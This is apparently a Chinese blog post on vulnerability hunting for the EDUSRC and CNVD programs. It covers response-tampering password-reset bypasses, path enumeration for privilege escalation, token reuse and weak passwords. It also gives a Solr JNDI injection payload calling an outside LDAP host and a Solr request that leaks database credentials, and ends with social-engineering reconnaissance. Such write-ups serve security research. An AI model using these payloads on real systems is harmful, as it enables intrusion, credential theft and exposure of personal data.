---
title: 【证书挖掘】手把手EDUSRC、CNVD挖洞技巧分享
url: https://mp.weixin.qq.com/s/Ut6lqW47yevQiQ5zqqXqFw
source: Doonsec's feed
date: 2026-02-18
fetch_date: 2026-02-19T04:17:06.106400
---

# 【证书挖掘】手把手EDUSRC、CNVD挖洞技巧分享

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/mcko8AHj6QVd5ibFY7TcmFh9IzCMKwXQ2E73yic0zZ7B4VCuuZfx09psHOUH0dtDiavHhCl8Tt29scHoWoDQrqgtsRCyFE9hTs7uMmpico5FhaU/0?wx_fmt=jpeg)

# 【证书挖掘】手把手EDUSRC、CNVD挖洞技巧分享

人生如茶
人生如茶

神农Sec

![]()

在小说阅读器中沉浸阅读

扫码加圈子

获内部资料

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic)

#

专注于SRC漏洞挖掘、红蓝对抗、渗透测试、代码审计JS逆向，CNVD和EDUSRC漏洞挖掘，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（课程培训限时优惠）。

#

文章作者：人生如茶

文章来源：https://www.freebuf.com/articles/web/444208.html

01

0x1 【证书挖掘】手把手EDUSRC、CNVD挖洞技巧分享

一：聊聊一些简单的逻辑漏洞，还有纯IP资产归属证明的方法

这里首先说一些简单的逻辑漏洞，就比如在一些密码重置功能，或者登录功能等，通过抓请求包或者返回包，然后把里面原来用户的id，手机号码Phone，还有添加一些json格式参数ture等等从而绕过一些效验不严格的系统导致的逻辑漏洞

### ![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkm1wybhFYiaTJ9NqopQkhpo1icx2TsnKpY0yJZmFJoDVx0UyB66ibELx3qw/640?wx_fmt=png&from=appmsg)

不先点击发送验证码功能，直接填写任意验证码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkm0AqQMoUibs6mlVic5z4D0aib37dbJBPvFAP8LOy76rSo8juhcOvj41gmg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmwGrG7s9WnlhP8aZjkNXfBFLVDwgH4E7l8TcJHicszMfibvxicf35s4FVQ/640?wx_fmt=png&from=appmsg)

返回包参数：success :false,"errorMsg":"验证码错误或者超时"}

返回包修改参数：success :1,"errorMsg":""}

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkm9zVFhwGjra3fsZTbhiajOZM5TcbVpZ3Y1EPNYNFhDcn3P38QMKFMTtQ/640?wx_fmt=png&from=appmsg)

成功进入到设置新密码环节。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmG5IG53U12K9ljS0nfZzTvVlWHHxg7c0TVASTGqwic8ZbQk4lr1gfJZw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmM3zkibxoudrRCibtmfNkBe01SZW2Bm8aryDiaLzTmRjjPDpBpfkjRpRpA/640?wx_fmt=png&from=appmsg)

![1755016910_689b6eceb7809a52ca4af.png!small?1755016911036](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmHg7icy8vKxUwaoib7DoPUXRZwV6rDtzTjL6lotC8ZmK9D69KHcop4C0w/640?wx_fmt=jpeg&from=appmsg)

这是我拿得一个简单到不能再简单的案例，这里我之拿出来说，是因为这个系统我觉得比较典型（其实就是抓请求包，抓返回包修改）刚开始抓包这里，我们可以看这个手机号在burp那里是不是，可以看到完整的手机号码（或者把手机号码替换成自己测试接收验证码的手机号码）看看能不能接受到验证码（这里我试过了，确实可以，逻辑+1）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmUyUG5DWhzWV49nh3LzHzibWhKU8UZK5Tmjqbhiacyvql1ibJkibyHyGibbQ/640?wx_fmt=png&from=appmsg)

还有返回包这里，改成0改成1  改成ture 等等都OK  逻辑+1

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmia2rItSgrkNgJho8n0eC8yicia0xMTgmliasVuzyicFjwrSduRicWOhZ9VQQ/640?wx_fmt=png&from=appmsg)

再比如这个，虽然前端页面是脱敏之后的数据，在抓取返回包中，直接泄露了管理员的邮箱跟手机号码，这个其实在红队角度来说拿到了也可以做一波社工。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkm7XqL9M4H1Bs5DXqnWQcHhbakg1yrVsiasmeK9ypia17sicTYpBzyJFcXw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkm6QDPONliaiaXtry9icLgQmvmzaleNzYL0iaB2575icbQYubaP0iaqvTOC5lg/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmqTn5vZJeJznrKqEEY6ib2wY3vDmpytQPdIv0cAlIfCVfPfDHrxd1jVg/640?wx_fmt=png&from=appmsg)

## 一个中X院下属资产系统，功能模块的垂直越权（简单来说就是路径拼接）

这里我随便注册了个xxxxx123的账号，登录之后是什么功能都没有的，后续用了一个接口然后拼接，

/achievement  达到了垂直越权

### ![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmUpGQPSjbicLrclZDh7FxFqPPHmZOnIbeYCfsTibhql7JcQqjiaAhpV9nA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkm2XMN5DibmkaTaBrpgNz1cZCEkJmCwCI2eiaBaHyZGab6FjaN05ag7YYA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmnnN9MLVxJHeicSNc4PcEQohSAibDRhKXC01XAVB7IFlm3Nqf2MPIX6MQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmgAVJfPzeicEwYmBaBNicZNyDTTEcibfhKVS4WyUza0Fp40IiaQjLKGWdhw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmxk73tn85P5aqDfTcdCNM6QuYXsAJqLicIoTmHzzvU0icBTEJib0wb5Tow/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmz9QUcrzXV9vdNnGQ0EQeQjAn0aDJjWewbT0FzicbtPgY29TWhfE4ickw/640?wx_fmt=png&from=appmsg)

好了，你是怎么知道用 /achievement  接口来越权的？

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmDMx9xoxyia2nToB8n5pNn9A5YWE8Ckl5DbtfAbQYHxUJiaX2JGqI9dxQ/640?wx_fmt=png&from=appmsg)

有一些系统会用“achievement”表示成绩、成果、荣誉等模块，在实际渗透中我发现系统如果涉及这方面的话，我就会优先枚举这些可能的 URL，比如：

/achievement
/exam
/score
/student
/archives
/admin
/manage

有些系统的接口命名非常直白，甚至直接是拼音 /chengji、/dangan。很多系统只在前端菜单限制普通用户看不到这些功能，但后端 API 并不做二次权限校验。如果直接访问 /achievement 就返回数据，说明存在水平/垂直越权漏洞。这种情况在政企和教育系统里特别常见，尤其是老旧的 JSP/ThinkPHP 系统。

JSP：老式 JSP+Servlet 系统，常在页面开头做 if(session==null) redirect login;，但对直接访问 URL 的请求不额外判断。

**ThinkPHP**（尤其是 TP3/TP5）：历史上路由与控制器访问限制默认宽松，如果没手动加 Auth 中间件，直接访问控制器方法几乎不受限制。

## 测试token是否永不过期

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmk4w6k5TkE59eek50DKgQqHH6FGqe7zjypodO0THMLB0EJ78PhuhNiaQ/640?wx_fmt=png&from=appmsg)

比如像这样的主系统，包含十几个子系统（后面看了下存在几千个学生、教职工还有家长信息等）外加上1000+摄像头 实时查看权限，还有其他设备可控制权限等等

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmJNPic8fpc3StrpAc9wGXWBfiasZcpBaLOoRZZQGibjlZnSGTQ6lwkm0iag/640?wx_fmt=png&from=appmsg)

对于大型系统都可以用子系统的接口进行拼接url，用新浏览器打开来尝试未授权，这里就是直接测出两个

xxxxx/xxxxxxxxx/index.html#/index?token=84e27aab-c89d-4fd3-a898-e82709821913

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkm3MduiaycblKwR29pDoBaqC8Q89ibyDZKHav2X9BqRV8G1TuFZGDNwdvA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmlh9wglXrCic1mLkcsl0xSF3kjeDteNNORtQAakpb62Rn4ibLI2QC9odw/640?wx_fmt=png&from=appmsg)

可能有些同学就疑问了，这么多系统，你都是怎么进去的？（别问了，问就是弱口令）

![1755083561_689c73295fd41cc38aa50.jpg!small?1755083561248](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmotrjBGaQpDicCgVWgDSaaMZmIAibJZNia14S07Uu5p1zajdWsDZF7KdyA/640?wx_fmt=jpeg&from=appmsg)

## Solr的一些操作（算老洞了，但是我也捡了几个，顺便说下自己挖过的案例）

高危就是

/solr/admin/cores?action=${jndi:ldap://xxxxxl.dnslog.cn}

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmyibFQcRiacj7mo8qj2caUHiciaObEYHeS65pxb9dHPws2p5fDiawB9R2EYw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmLHkJDjTKmtstADr3p3XBZ52MBLk4eEVofDnbkMa0eGgOSWSYuoCUKg/640?wx_fmt=png&from=appmsg)

还有一种情况就是，有防御的话会直接重置你的请求，这时候要换成一些无害的参数去读取它

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmibQaibMg3qy3nqibJG7egEa1ibzXxdLZog7RC9ghHelEbNkJVmhOCw04aA/640?wx_fmt=png&from=appmsg)

/solr/bookcontent\_core/dataimport?command=show-config

读取到了**数据库类型**：Oracle  IP信息，端口，账号，密码等等

![1755062786_689c22021866f3acc31e9.png!small?1755062786661](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmrP4vya0BQj9JMuUfXxEmLT721gSAUcjREpvafBRgWoickVrzbOSLvicw/640?wx_fmt=jpeg&from=appmsg)

## 纯IP资产归属证明的方法，这里我拿了一个IP例举

如果纯IP在微步情报社区显示未，中国教育网，学校单位的话，那可以直接当做证明。还有一种情况就是去搜一下这个IP的C段，如果该C段下存在教育单位的ICP备案，那大概率也属于该学校的资产

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkm7wnbxj5EqJ3RtuwPH7uBnGibhBbujkHnlu35wJLj8IHWDzQygEia6bfg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmRDXFJ5mKsIrBh8Ocoe3RNXh3tbqxFEFZlicMd5aStibKLZV9C6AL7kuw/640?wx_fmt=png&from=appmsg)

当然，如果是CNVD，某某单位，某局，某厅这种的，你可以查看一下是否是同一个网段的，什么是同一个网段呢，上面说了一种，现在说第二种，就是C段之内，虽然不存在同样得单位，但是存在其他相同性质的单位的（比如事业、机关）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXHx4tOeXeJ2RMDhQXqsmkmTpozNwx9O7UIt6icunNNticvpRicib7b0pvvvUJARZpaXsluFicRxWcFLGA/640?wx_fmt=png&from=appmsg)

## 二、红队社工篇：针对发布公开的通知公告进行信息收集的拷打小技巧

我之前一篇文章分享了，靠ICP备案还有网站实际使用者，而非软件或动态域名服务提供商都可以打供应链，这里我举例新姿势，但是有点费精力。就是看以往的一些发布通知或者公告，只要涉及市区，或者全市，甚至全省的，你都可以拿关键字出来来匹配一波资产探测

title="X...